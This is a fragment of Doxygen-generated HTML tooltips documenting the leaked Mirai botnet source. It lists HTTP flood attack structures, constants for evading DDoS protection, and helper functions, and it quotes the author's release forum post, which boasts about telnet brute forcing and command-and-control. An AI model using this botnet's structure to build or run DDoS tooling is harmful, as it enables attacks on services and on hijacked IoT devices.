<div class="ttc" id="structattack__http__state_html_a302b8de41c5e40a19ddd91fc95e71d7a"><div class="ttname"><a href="structattack__http__state.html#a302b8de41c5e40a19ddd91fc95e71d7a">attack_http_state::path</a></div><div class="ttdeci">char path[HTTP_PATH_MAX+1]</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00115">attack.h:115</a></div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_a983759d15797446fba097be4fd7654fb"><div class="ttname"><a href="mirai_2bot_2util_8c.html#a983759d15797446fba097be4fd7654fb">util_strncmp</a></div><div class="ttdeci">BOOL util_strncmp(char *str1, char *str2, int len)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00031">util.c:31</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_adccb5337cf206fe3eca7c4732f634bb9"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a></div><div class="ttdeci">uint16_t port_t</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00014">includes.h:14</a></div></div>
<div class="ttc" id="attack_8h_html_af614bdd4374d1ecf0ba5bb48a8cb4e65"><div class="ttname"><a href="attack_8h.html#af614bdd4374d1ecf0ba5bb48a8cb4e65">ATK_OPT_PATH</a></div><div class="ttdeci">#define ATK_OPT_PATH</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00068">attack.h:68</a></div></div>
<div class="ttc" id="attack_8h_html_af13bc0acf7afcddfcc5098dbe5c343aa"><div class="ttname"><a href="attack_8h.html#af13bc0acf7afcddfcc5098dbe5c343aa">HTTP_DOMAIN_MAX</a></div><div class="ttdeci">#define HTTP_DOMAIN_MAX</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00100">attack.h:100</a></div></div>
<div class="ttc" id="table_8h_html_aa990a86d534b2e4181148de832c921c5"><div class="ttname"><a href="table_8h.html#aa990a86d534b2e4181148de832c921c5">TABLE_HTTP_FOUR</a></div><div class="ttdeci">#define TABLE_HTTP_FOUR</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00073">table.h:73</a></div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_af2f61b2c3c38da3f06a301c596b5b47d"><div class="ttname"><a href="mirai_2bot_2util_8c.html#af2f61b2c3c38da3f06a301c596b5b47d">util_zero</a></div><div class="ttdeci">void util_zero(void *buf, int len)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00080">util.c:80</a></div></div>
<div class="ttc" id="ForumPost_8txt_html_ae4b9f60da1e934a3855a3b52163fa058"><div class="ttname"><a href="ForumPost_8txt.html#ae4b9f60da1e934a3855a3b52163fa058">domain</a></div><div class="ttdeci">try harder skiddo Your skeleton tool sucks it thought the attack decoder was sinden but it does not even use a text based protocol CNC and bot communicate over binary protocol you say some others kill based on cwd It shows how out of the loop you are with real malware Go back to skidland slaps for you Why are you writing reverse engineer tools You cannot even correctly reverse in the first place Please learn some skills first before trying to impress others Your arrogance in declaring how you beat me with your dumb kung fu statement made me laugh so hard while eating my SO had to pat me on the back Just as I forever be you will be doomed to mediocracy forever Requirements Bare Minimum for scan and for loading Pro for scanReceiver and distributor server for bots resolve a domain(resolv.c/resolv.h) and connect to that IP address-Bots brute telnet using an advanced SYN scanner that is around 80x faster than the one in qbot</div></div>
<div class="ttc" id="table_8h_html_abe6c60026b1f1980e83e5759b5246c5e"><div class="ttname"><a href="table_8h.html#abe6c60026b1f1980e83e5759b5246c5e">TABLE_ATK_ACCEPT_LNG</a></div><div class="ttdeci">#define TABLE_ATK_ACCEPT_LNG</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00055">table.h:55</a></div></div>
<div class="ttc" id="wget_8c_html_aa8318fbee111c5bde5952c63e894c962"><div class="ttname"><a href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a></div><div class="ttdeci">#define socket</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00047">wget.c:47</a></div></div>
<div class="ttc" id="attack_8h_html_aa069ca3abf2026e0e48d8f06ad47437c"><div class="ttname"><a href="attack_8h.html#aa069ca3abf2026e0e48d8f06ad47437c">ATK_OPT_POST_DATA</a></div><div class="ttdeci">#define ATK_OPT_POST_DATA</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00067">attack.h:67</a></div></div>
<div class="ttc" id="attack_8h_html_aff008d93b76d40a67da697001e176f6b"><div class="ttname"><a href="attack_8h.html#aff008d93b76d40a67da697001e176f6b">HTTP_CONN_SEND</a></div><div class="ttdeci">#define HTTP_CONN_SEND</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00088">attack.h:88</a></div></div>
<div class="ttc" id="table_8h_html_ab6dfc5137f16deb497a130057eb69830"><div class="ttname"><a href="table_8h.html#ab6dfc5137f16deb497a130057eb69830">TABLE_HTTP_ONE</a></div><div class="ttdeci">#define TABLE_HTTP_ONE</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00070">table.h:70</a></div></div>
<div class="ttc" id="wget_8c_html_a9c7f6d5331abb2692a876d5ee67474b7"><div class="ttname"><a href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a></div><div class="ttdeci">#define close</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00052">wget.c:52</a></div></div>
<div class="ttc" id="attack_8h_html_a61e0fc173a48e31ab11b5d4e54d751bd"><div class="ttname"><a href="attack_8h.html#a61e0fc173a48e31ab11b5d4e54d751bd">HTTP_CONN_INIT</a></div><div class="ttdeci">#define HTTP_CONN_INIT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00084">attack.h:84</a></div></div>
<div class="ttc" id="structattack__http__state_html_a57ddd53019ddf55a509aae9c74e2ecfa"><div class="ttname"><a href="structattack__http__state.html#a57ddd53019ddf55a509aae9c74e2ecfa">attack_http_state::last_recv</a></div><div class="ttdeci">int last_recv</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00111">attack.h:111</a></div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_a45cd12b38d32ad249e74803c96a12cd3"><div class="ttname"><a href="mirai_2bot_2util_8c.html#a45cd12b38d32ad249e74803c96a12cd3">util_atoi</a></div><div class="ttdeci">int util_atoi(char *str, int base)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00087">util.c:87</a></div></div>
<div class="ttc" id="table_8h_html_a0fcf8e231e646aaed0d7fcb495da1935"><div class="ttname"><a href="table_8h.html#a0fcf8e231e646aaed0d7fcb495da1935">TABLE_ATK_LOCATION_HDR</a></div><div class="ttdeci">#define TABLE_ATK_LOCATION_HDR</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00059">table.h:59</a></div></div>
<div class="ttc" id="table_8h_html_ac1a27c372d2f9a9c055a1bc0196c8764"><div class="ttname"><a href="table_8h.html#ac1a27c372d2f9a9c055a1bc0196c8764">TABLE_HTTP_FIVE</a></div><div class="ttdeci">#define TABLE_HTTP_FIVE</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00074">table.h:74</a></div></div>
<div class="ttc" id="structattack__http__state_html_a8e432d9597a1eafb950e8d2e82f677c1"><div class="ttname"><a href="structattack__http__state.html#a8e432d9597a1eafb950e8d2e82f677c1">attack_http_state::method</a></div><div class="ttdeci">char method[9]</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00118">attack.h:118</a></div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_a181a242a15f441fe3eefe68330b0c8e3"><div class="ttname"><a href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a></div><div class="ttdeci">int util_strlen(char *str)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00021">util.c:21</a></div></div>
<div class="ttc" id="attack_8h_html_a843d2259e52b51843a2abe0bfb764dc4"><div class="ttname"><a href="attack_8h.html#a843d2259e52b51843a2abe0bfb764dc4">HTTP_COOKIE_LEN_MAX</a></div><div class="ttdeci">#define HTTP_COOKIE_LEN_MAX</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00102">attack.h:102</a></div></div>
<div class="ttc" id="structattack__http__state_html"><div class="ttname"><a href="structattack__http__state.html">attack_http_state</a></div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00108">attack.h:108</a></div></div>
<div class="ttc" id="table_8c_html_a960bec3b47b287c42b06c26eb370ed67"><div class="ttname"><a href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a></div><div class="ttdeci">char * table_retrieve_val(int id, int *len)</div><div class="ttdef"><b>Definition:</b> <a href="table_8c_source.html#l00108">table.c:108</a></div></div>
<div class="ttc" id="structattack__http__state_html_a639ffb1e3a835ba06d0d33f1f9b26328"><div class="ttname"><a href="structattack__http__state.html#a639ffb1e3a835ba06d0d33f1f9b26328">attack_http_state::last_send</a></div><div class="ttdeci">int last_send</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00112">attack.h:112</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa8cecfc5c5c054d2875c03e77b7be15d"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a></div><div class="ttdeci">#define TRUE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00010">includes.h:10</a></div></div>
<div class="ttc" id="structattack__http__state_html_a872e7657446a595ea0704fc5c07c4586"><div class="ttname"><a href="structattack__http__state.html#a872e7657446a595ea0704fc5c07c4586">attack_http_state::content_length</a></div><div class="ttdeci">int content_length</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00125">attack.h:125</a></div></div>
<div class="ttc" id="attack_8h_html_a0b7ec3c5170952fe1071a9326cd51264"><div class="ttname"><a href="attack_8h.html#a0b7ec3c5170952fe1071a9326cd51264">HTTP_PATH_MAX</a></div><div class="ttdeci">#define HTTP_PATH_MAX</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00099">attack.h:99</a></div></div>
<div class="ttc" id="attack_8h_html_ac6eda2a3273daf4a93162bb51f969093"><div class="ttname"><a href="attack_8h.html#ac6eda2a3273daf4a93162bb51f969093">HTTP_RDBUF_SIZE</a></div><div class="ttdeci">#define HTTP_RDBUF_SIZE</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00097">attack.h:97</a></div></div>
<div class="ttc" id="table_8h_html_a2670187e338d8b1b08f699ceb5a7e90c"><div class="ttname"><a href="table_8h.html#a2670187e338d8b1b08f699ceb5a7e90c">TABLE_ATK_ACCEPT</a></div><div class="ttdeci">#define TABLE_ATK_ACCEPT</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00054">table.h:54</a></div></div>
<div class="ttc" id="attack_8h_html_af9036def147b9e5de7a7b981f1d6212e"><div class="ttname"><a href="attack_8h.html#af9036def147b9e5de7a7b981f1d6212e">HTTP_PROT_DOSARREST</a></div><div class="ttdeci">#define HTTP_PROT_DOSARREST</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00105">attack.h:105</a></div></div>
<div class="ttc" id="table_8h_html_af12a034b04caa3e4ac948b0ef4761da6"><div class="ttname"><a href="table_8h.html#af12a034b04caa3e4ac948b0ef4761da6">TABLE_ATK_KEEP_ALIVE</a></div><div class="ttdeci">#define TABLE_ATK_KEEP_ALIVE</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00053">table.h:53</a></div></div>
<div class="ttc" id="table_8h_html_a6bb03316c5d32d6053734ac6ceec2d82"><div class="ttname"><a href="table_8h.html#a6bb03316c5d32d6053734ac6ceec2d82">TABLE_ATK_TRANSFER_ENCODING_HDR</a></div><div class="ttdeci">#define TABLE_ATK_TRANSFER_ENCODING_HDR</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00062">table.h:62</a></div></div>
<div class="ttc" id="structattack__http__state_html_a706d58c70ae03423d8b1af95c2aaf8ca"><div class="ttname"><a href="structattack__http__state.html#a706d58c70ae03423d8b1af95c2aaf8ca">attack_http_state::domain</a></div><div class="ttdeci">char domain[HTTP_DOMAIN_MAX+1]</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00116">attack.h:116</a></div></div>
<div class="ttc" id="structattack__http__state_html_a5b3a33cc244ec2615f05092657be65f5"><div class="ttname"><a href="structattack__http__state.html#a5b3a33cc244ec2615f05092657be65f5">attack_http_state::postdata</a></div><div class="ttdeci">char postdata[HTTP_POST_MAX+1]</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00117">attack.h:117</a></div></div>
<div class="ttc" id="structattack__http__state_html_a97f15ea73d0347511f511318f0949e86"><div class="ttname"><a href="structattack__http__state.html#a97f15ea73d0347511f511318f0949e86">attack_http_state::protection_type</a></div><div class="ttdeci">int protection_type</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00121">attack.h:121</a></div></div>
<div class="ttc" id="table_8h_html_a98de50549fdb839f2ba413f44e0d3e6a"><div class="ttname"><a href="table_8h.html#a98de50549fdb839f2ba413f44e0d3e6a">TABLE_ATK_CONTENT_LENGTH_HDR</a></div><div class="ttdeci">#define TABLE_ATK_CONTENT_LENGTH_HDR</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00061">table.h:61</a></div></div>
<div class="ttc" id="attack_8h_html_afb5c550090ed0a9640f362e9897ee7cd"><div class="ttname"><a href="attack_8h.html#afb5c550090ed0a9640f362e9897ee7cd">HTTP_CONN_CLOSED</a></div><div class="ttdeci">#define HTTP_CONN_CLOSED</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00095">attack.h:95</a></div></div>
<div class="ttc" id="table_8h_html_a31f1bf8dcf162592001058f12362eb55"><div class="ttname"><a href="table_8h.html#a31f1bf8dcf162592001058f12362eb55">TABLE_ATK_SET_COOKIE_HDR</a></div><div class="ttdeci">#define TABLE_ATK_SET_COOKIE_HDR</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00060">table.h:60</a></div></div>
<div class="ttc" id="table_8h_html_a99cbff873fe834c6ee8c966fd88c6bdc"><div class="ttname"><a href="table_8h.html#a99cbff873fe834c6ee8c966fd88c6bdc">TABLE_HTTP_TWO</a></div><div class="ttdeci">#define TABLE_HTTP_TWO</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00071">table.h:71</a></div></div>
<div class="ttc" id="structattack__http__state_html_a1b80b17b3f367edadba69edf86f03f0c"><div class="ttname"><a href="structattack__http__state.html#a1b80b17b3f367edadba69edf86f03f0c">attack_http_state::num_cookies</a></div><div class="ttdeci">int num_cookies</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00127">attack.h:127</a></div></div>
<div class="ttc" id="attack_8h_html_a8491fa980eede52fb92fb6dd2a46a913"><div class="ttname"><a href="attack_8h.html#a8491fa980eede52fb92fb6dd2a46a913">HTTP_HACK_DRAIN</a></div><div class="ttdeci">#define HTTP_HACK_DRAIN</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00098">attack.h:98</a></div></div>
<div class="ttc" id="table_8c_html_a0c03e9a9ebea1c0e6b98b969b56825b2"><div class="ttname"><a href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a></div><div class="ttdeci">void table_lock_val(uint8_t id)</div><div class="ttdef"><b>Definition:</b> <a href="table_8c_source.html#l00093">table.c:93</a></div></div>
<div class="ttc" id="rand_8c_html_accf5c4faf4fb7eb9d74bbf1764921b00"><div class="ttname"><a href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a></div><div class="ttdeci">uint32_t rand_next(void)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00021">rand.c:21</a></div></div>
<div class="ttc" id="table_8h_html_a260fbfdad3b4d569ea5bf904538e0628"><div class="ttname"><a href="table_8h.html#a260fbfdad3b4d569ea5bf904538e0628">TABLE_ATK_CLOUDFLARE_NGINX</a></div><div class="ttdeci">#define TABLE_ATK_CLOUDFLARE_NGINX</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00067">table.h:67</a></div></div>
<div class="ttc" id="structattack__http__state_html_af51f958664cbeb8bf8d6e29ec166e557"><div class="ttname"><a href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">attack_http_state::rdbuf</a></div><div class="ttdeci">char rdbuf[HTTP_RDBUF_SIZE]</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00131">attack.h:131</a></div></div>
<div class="ttc" id="attack_8c_html_a79b03d7c093d14a1640b2e5bcf2c3c38"><div class="ttname"><a href="attack_8c.html#a79b03d7c093d14a1640b2e5bcf2c3c38">attack_get_opt_str</a></div><div class="ttdeci">char * attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00193">attack.c:193</a></div></div>
<div class="ttc" id="table_8h_html_a89772e3bed797cb16a658f935bc8c37b"><div class="ttname"><a href="table_8h.html#a89772e3bed797cb16a658f935bc8c37b">TABLE_ATK_CHUNKED</a></div><div class="ttdeci">#define TABLE_ATK_CHUNKED</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00063">table.h:63</a></div></div>
<div class="ttc" id="attack_8h_html_a17d0f5a78e9f64122185611485c18222"><div class="ttname"><a href="attack_8h.html#a17d0f5a78e9f64122185611485c18222">HTTP_CONN_CONNECTING</a></div><div class="ttdeci">#define HTTP_CONN_CONNECTING</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00086">attack.h:86</a></div></div>
<div class="ttc" id="table_8h_html_a1f919690118832e6a9c5680ca6ab8686"><div class="ttname"><a href="table_8h.html#a1f919690118832e6a9c5680ca6ab8686">TABLE_ATK_CONTENT_TYPE</a></div><div class="ttdeci">#define TABLE_ATK_CONTENT_TYPE</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00056">table.h:56</a></div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_a98833e069ccfb346a13512872cd21a6c"><div class="ttname"><a href="mirai_2bot_2util_8c.html#a98833e069ccfb346a13512872cd21a6c">util_itoa</a></div><div class="ttdeci">char * util_itoa(int value, int radix, char *string)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00132">util.c:132</a></div></div>
<div class="ttc" id="table_8h_html_af1d5bc3f0c5007adc2bb968ab21fda6c"><div class="ttname"><a href="table_8h.html#af1d5bc3f0c5007adc2bb968ab21fda6c">TABLE_HTTP_THREE</a></div><div class="ttdeci">#define TABLE_HTTP_THREE</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00072">table.h:72</a></div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_aa244b92b644b15174da5ed933c90f16b"><div class="ttname"><a href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a></div><div class="ttdeci">int util_stristr(char *haystack, int haystack_len, char *str)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00209">util.c:209</a></div></div>
<div class="ttc" id="attack_8h_html_a4c326567294cc6655e9f6a380c7f736f"><div class="ttname"><a href="attack_8h.html#a4c326567294cc6655e9f6a380c7f736f">ATK_OPT_DOMAIN</a></div><div class="ttdeci">#define ATK_OPT_DOMAIN</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00054">attack.h:54</a></div></div>
<div class="ttc" id="attack_8h_html_a91cd4ed6175b666edf34c1a23bbbe368"><div class="ttname"><a href="attack_8h.html#a91cd4ed6175b666edf34c1a23bbbe368">HTTP_CONN_QUEUE_RESTART</a></div><div class="ttdeci">#define HTTP_CONN_QUEUE_RESTART</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00094">attack.h:94</a></div></div>
<div class="ttc" id="structattack__http__state_html_a93cf57948e424620047d9381b73f8fcd"><div class="ttname"><a href="structattack__http__state.html#a93cf57948e424620047d9381b73f8fcd">attack_http_state::cookies</a></div><div class="ttdeci">char cookies[HTTP_COOKIE_MAX][HTTP_COOKIE_LEN_MAX]</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00128">attack.h:128</a></div></div>
<div class="ttc" id="attack_8h_html_a9fe6114dced0ca47726f7afd1b3890f1"><div class="ttname"><a href="attack_8h.html#a9fe6114dced0ca47726f7afd1b3890f1">HTTP_CONN_RECV_BODY</a></div><div class="ttdeci">#define HTTP_CONN_RECV_BODY</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00091">attack.h:91</a></div></div>
<div class="ttc" id="structattack__http__state_html_a365269c0f55832182c8a76236ea80c18"><div class="ttname"><a href="structattack__http__state.html#a365269c0f55832182c8a76236ea80c18">attack_http_state::keepalive</a></div><div class="ttdeci">int keepalive</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00123">attack.h:123</a></div></div>
<div class="ttc" id="table_8h_html_a56932ae77dd79f16be9f28341dfd438f"><div class="ttname"><a href="table_8h.html#a56932ae77dd79f16be9f28341dfd438f">TABLE_ATK_REFRESH_HDR</a></div><div class="ttdeci">#define TABLE_ATK_REFRESH_HDR</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00058">table.h:58</a></div></div>
<div class="ttc" id="attack_8h_html_a7afb6e2da31b70aad81a3a8c4cce03ac"><div class="ttname"><a href="attack_8h.html#a7afb6e2da31b70aad81a3a8c4cce03ac">HTTP_COOKIE_MAX</a></div><div class="ttdeci">#define HTTP_COOKIE_MAX</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00101">attack.h:101</a></div></div>
<div class="ttc" id="table_8h_html_a3e6171ef594c03bf2526e8d43c9fbdb3"><div class="ttname"><a href="table_8h.html#a3e6171ef594c03bf2526e8d43c9fbdb3">TABLE_ATK_DOSARREST</a></div><div class="ttdeci">#define TABLE_ATK_DOSARREST</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00066">table.h:66</a></div></div>
<div class="ttc" id="attack_8h_html_acb5cf7d3ab57770048fc89abd9f386e8"><div class="ttname"><a href="attack_8h.html#acb5cf7d3ab57770048fc89abd9f386e8">HTTP_CONN_RESTART</a></div><div class="ttdeci">#define HTTP_CONN_RESTART</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00085">attack.h:85</a></div></div>
<div class="ttc" id="attack_8h_html_aaed58b5e52e808b4237035050183f315"><div class="ttname"><a href="attack_8h.html#aaed58b5e52e808b4237035050183f315">HTTP_CONNECTION_MAX</a></div><div class="ttdeci">#define HTTP_CONNECTION_MAX</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00017">attack.h:17</a></div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_a4ac4793080569db24ebca3104041425b"><div class="ttname"><a href="mirai_2bot_2util_8c.html#a4ac4793080569db24ebca3104041425b">util_strcmp</a></div><div class="ttdeci">BOOL util_strcmp(char *str1, char *str2)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00047">util.c:47</a></div></div>
<div class="ttc" id="attack_8c_html_ab59e5bf31f63eeb001f8ec1278a15907"><div class="ttname"><a href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a></div><div class="ttdeci">int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00206">attack.c:206</a></div></div>
<div class="ttc" id="attack_8h_html_ac0ce7d29746181bb91fd95569c625f9f"><div class="ttname"><a href="attack_8h.html#ac0ce7d29746181bb91fd95569c625f9f">ATK_OPT_METHOD</a></div><div class="ttdeci">#define ATK_OPT_METHOD</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00066">attack.h:66</a></div></div>
<div class="ttc" id="structattack__http__state_html_a3809782e42bb4bc6df9e5af0e054d65e"><div class="ttname"><a href="structattack__http__state.html#a3809782e42bb4bc6df9e5af0e054d65e">attack_http_state::user_agent</a></div><div class="ttdeci">char user_agent[512]</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00114">attack.h:114</a></div></div>
<div class="ttc" id="table_8c_html_aa5a64b3cddd9889fca3114b5a87c402e"><div class="ttname"><a href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a></div><div class="ttdeci">void table_unlock_val(uint8_t id)</div><div class="ttdef"><b>Definition:</b> <a href="table_8c_source.html#l00078">table.c:78</a></div></div>
<div class="ttc" id="ForumPost_8txt_html_a3eaa76d3cfe977972a9bf87dbc12c50f"><div class="ttname"><a href="ForumPost_8txt.html#a3eaa76d3cfe977972a9bf87dbc12c50f">connect</a></div><div class="ttdeci">World s Largest Echo CNC source code release Anna When I first go in DDoS I wasn t planning on staying in it long I made my there s lots of eyes looking at IOT so it s time to GTFO I know every skid and their it s their wet dream to have something besides qbot So I have an amazing release for you With I usually pull max bots from telnet alone after the Kreb ISPs been slowly shutting down and cleaning up their act max pull is about and dropping I am your and I will treat you real my hf chan And to everyone that thought they were doing anything by hitting my I had good this bot uses domain for CNC It takes seconds for all bots to lol shoutout to this blog post by malwaremustdie thought you were good but you really just completely and totally failed in reversing this binary We still have better kung fu than you kiddos don t make me laugh you made so many mistakes and even confused some different binaries with my LOL Let me give you some slaps back port is not for back connect</div><div class="ttdef"><b>Definition:</b> <a href="ForumPost_8txt_source.html#l00001">ForumPost.txt:1</a></div></div>
<div class="ttc" id="table_8h_html_afdae87bf33d9c2f2407b37fab6e91628"><div class="ttname"><a href="table_8h.html#afdae87bf33d9c2f2407b37fab6e91628">TABLE_ATK_CONNECTION_HDR</a></div><div class="ttdeci">#define TABLE_ATK_CONNECTION_HDR</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00065">table.h:65</a></div></div>
<div class="ttc" id="structattack__http__state_html_a69965dc0e1f22c39e1240a8440ab89e4"><div class="ttname"><a href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">attack_http_state::state</a></div><div class="ttdeci">uint8_t state</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00110">attack.h:110</a></div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_a705b6b933bc7bf0bdcb9b47833a78947"><div class="ttname"><a href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a></div><div class="ttdeci">int util_strcpy(char *dst, char *src)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00063">util.c:63</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa93f0eb578d23995850d61f7d61c55c1"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a></div><div class="ttdeci">#define FALSE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00009">includes.h:9</a></div></div>
<div class="ttc" id="loader_2src_2headers_2util_8h_html_ae46c9b71f57c253f2ba79ce6bd168c4d"><div class="ttname"><a href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a></div><div class="ttdeci">int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2util_8c_source.html#l00111">util.c:111</a></div></div>
<div class="ttc" id="structattack__http__state_html_ae425bd8d4b3c18ca24d472028e024db4"><div class="ttname"><a href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">attack_http_state::fd</a></div><div class="ttdeci">int fd</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00109">attack.h:109</a></div></div>
<div class="ttc" id="attack_8h_html_ab8471c4c3e703d3c9ee4e971c48ba5fb"><div class="ttname"><a href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a></div><div class="ttdeci">#define ATK_OPT_DPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00053">attack.h:53</a></div></div>
<div class="ttc" id="table_8h_html_aa5dbdc8879922e71d9a920cc8bc91657"><div class="ttname"><a href="table_8h.html#aa5dbdc8879922e71d9a920cc8bc91657">TABLE_ATK_SET_COOKIE</a></div><div class="ttdeci">#define TABLE_ATK_SET_COOKIE</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00057">table.h:57</a></div></div>
<div class="ttc" id="attack_8h_html_abedf69cb8cdb85bfc7f307503fd62775"><div class="ttname"><a href="attack_8h.html#abedf69cb8cdb85bfc7f307503fd62775">HTTP_CONN_RECV_HEADER</a></div><div class="ttdeci">#define HTTP_CONN_RECV_HEADER</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00090">attack.h:90</a></div></div>
<div class="ttc" id="table_8h_html_a1665384941722febe6d2a8b1e58655be"><div class="ttname"><a href="table_8h.html#a1665384941722febe6d2a8b1e58655be">TABLE_ATK_KEEP_ALIVE_HDR</a></div><div class="ttdeci">#define TABLE_ATK_KEEP_ALIVE_HDR</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00064">table.h:64</a></div></div>
